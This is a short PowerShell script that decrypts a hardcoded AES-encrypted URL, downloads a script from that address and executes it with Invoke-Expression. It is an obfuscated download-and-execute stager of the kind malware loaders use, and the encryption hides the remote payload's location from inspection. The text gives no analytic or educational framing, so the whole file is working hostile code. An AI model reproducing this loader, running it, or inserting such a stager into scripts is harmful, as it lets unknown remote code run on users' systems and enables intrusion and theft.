$ErrorActionPreference = "Stop"
$keyB64 = "p1K03LMiTRzs1mYkCB8PF3I+Bp5hqYCrjfqusN9r9ao="
$ivB64 = "77cLNrq0eKEITWbGK6e3FA=="
$cipherB64 = "ZB/nvqZIzxgxSdYpZB4o/0BSoLCENcZIcyWC7WrI18PlW2AR9LmceXsJh+7zKRbR"
$aes = [Security.Cryptography.Aes]::Create()
$aes.Mode = [Security.Cryptography.CipherMode]::CBC
$aes.Padding = [Security.Cryptography.PaddingMode]::PKCS7
$aes.Key = [Convert]::FromBase64String($keyB64)
$aes.IV = [Convert]::FromBase64String($ivB64)
$decryptor = $aes.CreateDecryptor()
$plain = $decryptor.TransformFinalBlock([Convert]::FromBase64String($cipherB64), 0, [Convert]::FromBase64String($cipherB64).Length)
$decryptor.Dispose()
$aes.Dispose()
$url = [Text.Encoding]::UTF8.GetString($plain)
$wc = New-Object System.Net.WebClient
$wc.Encoding = [Text.Encoding]::UTF8
$script = $wc.DownloadString($url)
$wc.Dispose()
iex $script
